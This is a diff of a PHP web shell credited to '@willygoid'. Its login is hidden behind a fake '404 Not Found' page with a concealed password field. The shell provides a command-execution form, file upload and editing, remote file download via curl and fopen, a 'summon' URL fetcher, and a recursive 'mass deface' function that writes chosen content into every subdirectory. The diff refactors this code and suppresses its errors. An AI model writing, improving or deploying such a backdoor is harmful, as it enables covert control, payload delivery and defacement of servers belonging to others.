@@ -24,12 +24,27 @@ if (!isset($_SESSION['logged_in'])) {
             }
 
             $_SESSION['logged_in'] = true;
-            header('Location:');
+            header('Location: '.$_SERVER['PHP_SELF']);
             exit;
         }
 
     }
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>404 Not Found</title><style>html,body{margin:0;padding:0;height:100%;overflow:hidden}iframe{position:absolute;top:0;left:0;width:100vw;height:100vh;border:none}#form{position:absolute;z-index:9999}#form input{opacity:0;pointer-events:none;position:absolute;cursor:default;transition:0.3s}#form input.revealed{opacity:1;pointer-events:auto;cursor:pointer}#form button{display:none}.clue-dot{position:fixed;bottom:20px;right:20px;width:6px;height:6px;background:rgba(0,0,0,0.1);border-radius:50%;opacity:0.5;cursor:pointer}</style></head><body><iframe src="/404"></iframe><form id="form" method="post"><input type="password" name="password" id="input" autocomplete="off"><button type="submit">Login</button></form><div class="clue-dot" title="404"></div><script>const f=document.getElementById("form"),i=document.getElementById("input"),d=document.querySelector(".clue-dot"),x=Math.random()*(window.innerWidth-100),y=Math.random()*(window.innerHeight-30);f.style.left=`${x}px`;f.style.top=`${y}px`;d.onclick=()=>{i.classList.add("revealed");i.focus()};</script></body></html>'; exit;
+}
+
+// Helper function for mass deface
+function mdfc($d, $f, $c, &$s=0, &$g=0){
+    if(!is_dir($d)) return;
+    $p = rtrim($d, '/')."/".$f;
+    if(@file_put_contents($p, $c) !== false){ echo "[✓] $p\n"; $s++; } else { echo "[✗] $p\n"; $g++; }
+    $scan = @scandir($d);
+    if(is_array($scan)){
+        foreach($scan as $i){
+            if($i!='.' && $i!='..' && is_dir($d.'/'.$i)){
+                mdfc($d.'/'.$i, $f, $c, $s, $g);
+            }
+        }
+    }
 }
 
 // Path
@@ -79,20 +94,16 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             exit;
         }
         else if ($action=='mdfc' && isset($_POST['mdfc_base_dir'], $_POST['mdfc_name'], $_POST['mdfc_content'])) {
-            function mdfc($d,$f,$c,&$s=0,&$g=0){
-                if(!is_dir($d))return;
-                $p=rtrim($d,'/')."/".$f;
-                if(@file_put_contents($p,$c)!==false){echo "[✓] $p\n";$s++;}else{echo "[✗] $p\n";$g++;}
-                foreach(scandir($d)as$i)if($i!='.'&&$i!='..'&&is_dir($d.'/'.$i))mdfc($d.'/'.$i,$f,$c,$s,$g);
-            }
             echo "<pre>";
-            mdfc($_POST['mdfc_base_dir'],basename($_POST['mdfc_name']),$_POST['mdfc_content'],$s,$g);
-            echo "\Done. Success: $s | Failed: $g</pre>";exit;
+            $s = 0; $g = 0;
+            mdfc($_POST['mdfc_base_dir'], basename($_POST['mdfc_name']), $_POST['mdfc_content'], $s, $g);
+            echo "\nDone. Success: $s | Failed: $g</pre>";
+            exit;
         }
 
         elseif (isset($_POST['get_content'])) {
             $f = basename($_POST['get_content']);
-            if ($f == $self) {
+            if ($f == basename($self)) {
                 echo 'Author @willygoid';
             } else {
                 $file = $path.'/'.$f;
@@ -101,40 +112,40 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             exit;
         }
         elseif (isset($_POST['new_folder'])){
-            mkdir($path.'/'.basename($_POST['new_folder']));
+            @mkdir($path.'/'.basename($_POST['new_folder']));
             $_SESSION['msg']='Folder created'; $_SESSION['msg_type']='success';
         }
         elseif (isset($_POST['new_file'])){
             $new = basename($_POST['new_file']);
-            if($new==$self){
+            if($new==basename($self)){
                 $_SESSION['msg']='Cannot overwrite file manager itself'; $_SESSION['msg_type']='error';
             } else {
-                file_put_contents($path.'/'.$new, '');
+                @file_put_contents($path.'/'.$new, '');
                 $_SESSION['msg']='File created'; $_SESSION['msg_type']='success';
             }
         }
         elseif (isset($_POST['delete'])){
             $t=basename($_POST['delete']);
-            if($t==$self){
+            if($t==basename($self)){
                 $_SESSION['msg']='Cannot delete file manager itself'; $_SESSION['msg_type']='error';
             } else {
                 $target=$path.'/'.$t;
-                if(is_dir($target)?rmdir($target):unlink($target)){
+                if(is_dir($target)?@rmdir($target):@unlink($target)){
                     $_SESSION['msg']='Deleted successfully'; $_SESSION['msg_type']='success';
                 } else{ $_SESSION['msg']='Delete failed'; $_SESSION['msg_type']='error'; }
             }
         }
         elseif (isset($_POST['rename_from'],$_POST['rename_to'])){
-            if(rename($path.'/'.basename($_POST['rename_from']),$path.'/'.basename($_POST['rename_to']))){
+            if(@rename($path.'/'.basename($_POST['rename_from']),$path.'/'.basename($_POST['rename_to']))){
                 $_SESSION['msg']='Renamed successfully'; $_SESSION['msg_type']='success';
             } else{ $_SESSION['msg']='Rename failed'; $_SESSION['msg_type']='error'; }
         }
         elseif (isset($_POST['edit_file'],$_POST['content'])){
             $edit = basename($_POST['edit_file']);
-            if($edit==$self){
+            if($edit==basename($self)){
                 $_SESSION['msg']='Cannot edit file manager itself'; $_SESSION['msg_type']='error';
             } else {
-                if(file_put_contents($path.'/'.$edit,$_POST['content'])!==false){
+                if(@file_put_contents($path.'/'.$edit,$_POST['content'])!==false){
                     $_SESSION['msg']='Saved successfully'; $_SESSION['msg_type']='success';
                 } else{ $_SESSION['msg']='Save failed'; $_SESSION['msg_type']='error'; }
             }
@@ -142,7 +153,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         elseif (isset($_FILES['files'])){
             $ok=0;
             foreach($_FILES['files']['tmp_name'] as $i=>$tmp)
-                if(move_uploaded_file($tmp,$path.'/'.basename($_FILES['files']['name'][$i]))) $ok++;
+                if(@move_uploaded_file($tmp,$path.'/'.basename($_FILES['files']['name'][$i]))) $ok++;
             $_SESSION['msg']= $ok.' file(s) uploaded'; $_SESSION['msg_type']='success';
         }
         elseif (isset($_POST['update_perm']) && isset($_POST['perm_value'])) {
@@ -161,11 +172,11 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             $url=trim($_POST['download_url']); $out=$path.'/'.basename($_POST['output_name']); $method=$_POST['method'];
             $ok=false;
             switch($method){
-                case 'file_get_contents': $d=@file_get_contents($url); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
+                case 'file_get_contents': $d=@file_get_contents($url); if($d!==false)$ok=@file_put_contents($out,$d)!==false; break;
                 case 'copy': $ok=@copy($url,$out); break;
                 case 'fopen': $in=@fopen($url,'rb'); $outf=@fopen($out,'wb'); if($in&&$outf){while(!feof($in))fwrite($outf,fread($in,8192)); fclose($in); fclose($outf); $ok=true;} break;
-                case 'stream_context': $ctx=stream_context_create(); $d=@file_get_contents($url,false,$ctx); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
-                case 'curl': $ch=curl_init($url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $d=curl_exec($ch); curl_close($ch); if($d!==false)$ok=file_put_contents($out,$d)!==false; break;
+                case 'stream_context': $ctx=stream_context_create(); $d=@file_get_contents($url,false,$ctx); if($d!==false)$ok=@file_put_contents($out,$d)!==false; break;
+                case 'curl': $ch=curl_init($url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $d=curl_exec($ch); curl_close($ch); if($d!==false)$ok=@file_put_contents($out,$d)!==false; break;
             }
             $_SESSION['msg']= $ok?'Download success':'Download failed'; $_SESSION['msg_type']=$ok?'success':'error';
         }
@@ -174,12 +185,13 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 }
 
 // Scan dir
-$files=scandir($path);
+$files = @scandir($path) ?: [];
 $folders=[];$regular_files=[];
 foreach($files as $f){
     if($f=='.'||$f=='..')continue;
     $fp=$path.'/'.$f;
-    $stat = stat($fp);
+    $stat = @stat($fp);
+    if(!$stat) continue;
     if($search && stripos($f,$search)===false) continue;
     $u = function_exists('posix_getpwuid') ? (posix_getpwuid($stat['uid'])['name'] ?? '?') : '?';
     $g = function_exists('posix_getgrgid') ? (posix_getgrgid($stat['gid'])['name'] ?? '?') : '?';
@@ -314,6 +326,15 @@ $(function(){
     $('#uploadBtn').click(()=>$('#uploadInput').click());
     $('.close').click(()=>$('.modal').addClass('hidden'));
     $('#uploadInput').change(()=>$('#uploadForm').submit());
+
+    $('#summon-btn').on('click', function () {
+        const url = $('#summon-url').val();
+        if(!url) return;
+        const path = <?= json_encode($path) ?>;
+        $.post('', { summon_url: url, summon_path: path }, function () {
+            location.reload();
+        });
+    });
 });
 </script>
 <script>
@@ -328,15 +349,6 @@ $(function(){
     });
     $('.menu-btn[data-action="<?=$action?>"]').addClass('bg-blue-500 text-white').removeClass('bg-gray-200 text-gray-800');
 });
-</script>
-<script>
-    $('#summon-btn').on('click', function () {
-        const url = $('#summon-url').val();
-        const path = <?= json_encode($path) ?>;
-        $.post('', { summon_url: url, summon_path: path }, function () {
-            location.reload();
-        });
-    });
 </script>
 <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
@@ -406,7 +418,7 @@ if($action=='serverinfo'):
 <?php elseif($action=='command'): ?>
     <div class="container mx-auto p-4 bg-white rounded-lg shadow">
     <h2 class="text-xl font-bold mb-2">💡 Execute Command</h2>
-    <form method="post" onsubmit="$.post('?action=command',$ (this).serialize(),function(d){$('#output').html(d);});return false;">
+    <form method="post" onsubmit="$.post('?action=command',$(this).serialize(),function(d){$('#output').html(d);});return false;">
     <input name="cmd" class="border w-full px-2 py-1 mb-2" placeholder="Enter command...">
     <input type="hidden" name="path" value="<?=htmlspecialchars($path)?>">
     <button class="bg-green-500 text-white px-3 py-1 rounded">Run</button>
@@ -564,7 +576,7 @@ toastr.<?= $_SESSION['msg_type']=='error'?'error':'success' ?>("<?= addslashes($
 <footer class="container mx-auto p-4">
       <div class="flex flex-col sm:flex-row justify-between items-center pt-4 border-t border-gray-300">
         <div class="flex-grow lg:w-1/2 text-gray-600">
-              <p class="text-gray-700"></p>Copyleft <?=date('Y');?> @willygoid</p>
+              <p class="text-gray-700">Copyleft <?=date('Y');?> @willygoid</p>
         </div>
         <div class="flex-grow lg:w-1/2 text-gray-600 text-right">
           <p class="font-bold"> <button type="button" id="toggleTheme" class="bg-gray-800 text-white px-2 py-1 rounded">🌙 Dark</button> v<?=APP_VER;?></p>
@@ -575,22 +587,20 @@ toastr.<?= $_SESSION['msg_type']=='error'?'error':'success' ?>("<?= addslashes($
 $(function(){
   $('#toggleTheme').click(function(){
     $('body').toggleClass('dark bg-gray-900 text-gray-100');
-    // Toggle tombol text
     if($('body').hasClass('dark')){
       $(this).text('☀️ Light').removeClass('bg-gray-800').addClass('bg-yellow-500');
     } else {
       $(this).text('🌙 Dark').removeClass('bg-yellow-500').addClass('bg-gray-800');
     }
-    // Simpan preferensi ke localStorage
     if($('body').hasClass('dark')) localStorage.setItem('theme','dark');
     else localStorage.setItem('theme','light');
   });
 
-  // Cek preferensi theme saat load
   if(localStorage.getItem('theme')==='dark'){
     $('body').addClass('dark bg-gray-900 text-gray-100');
     $('#toggleTheme').text('☀️ Light').removeClass('bg-gray-800').addClass('bg-yellow-500');
   }
 });
 </script>
-</body></html> ?>
+</body>
+</html>
